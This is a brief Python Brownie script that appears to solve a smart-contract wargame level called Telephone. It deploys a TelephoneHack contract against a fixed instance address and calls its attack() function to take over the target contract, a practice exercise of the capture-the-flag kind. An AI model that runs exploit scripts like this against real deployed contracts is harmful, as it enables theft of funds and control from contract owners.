from brownie import config, network, accounts, Telephone, TelephoneHack

def main():
    player = accounts.add(config["wallets"]["from_key"]) 

    InstanceAddress = "0x5bf844A32cA559f50f379F2B8F8Ad5Ea463C4376"

    telephone = Telephone.at(InstanceAddress)

    telephoneHack = TelephoneHack.deploy(InstanceAddress, {"from": player})
    telephoneHack.attack()